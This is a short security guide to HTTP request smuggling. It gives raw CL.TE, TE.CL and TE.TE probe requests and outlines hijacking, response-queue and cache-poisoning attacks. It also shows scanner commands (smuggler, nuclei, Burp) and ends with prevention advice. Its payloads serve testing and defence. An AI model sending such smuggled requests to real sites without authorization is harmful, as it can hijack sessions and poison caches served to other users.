# HTTP Request Smuggling — Complete Guide

## 1. Detection

### CL.TE (Content-Length vs Transfer-Encoding)
```
POST / HTTP/1.1
Host: target
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL (Transfer-Encoding vs Content-Length)
```
POST / HTTP/1.1
Host: target
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

### TE.TE (Transfer-Encoding obfuscation)
```
Transfer-Encoding: chunked
Transfer-encoding: identity

Transfer-Encoding: chunked
Transfer-Encoding: chunked

Transfer-Encoding: xchunked
```

## 2. Exploitation

### 2.1 Request Hijacking
```
Smuggled request:
GET /admin HTTP/1.1
Host: target
Cookie: session=admin_session_token

→ Next user's request gets the admin response
```

### 2.2 Response Queue Poisoning
```
Smuggled request returns sensitive data
→ Next innocent user receives that data
```

### 2.3 Cache Poisoning
```
Smuggled request with malicious payload
→ CDN caches the poisoned response
→ All subsequent users get the poisoned page
```

### 2.4 Request Splitting
```
Break the request into two separate requests
→ Second request is invisible to front-end server
→ Can bypass security controls
```

## 3. Tools

### smuggler
```bash
python3 smuggler.py -u http://target
```

### nuclei
```bash
nuclei -u http://target -tags smuggling
```

### Burp Suite
```
1. Send request to Repeater
2. Add both Content-Length and Transfer-Encoding
3. Test CL.TE and TE.CL variants
4. Use Turbo Intruder for timing-based detection
```

## 4. Prevention

1. **Normalize headers at load balancer** — Remove ambiguous headers
2. **Use HTTP/2 end-to-end** — No Transfer-Encoding ambiguity
3. **Reject ambiguous requests** — If both CL and TE present, reject
4. **WAF rules** — Detect conflicting headers
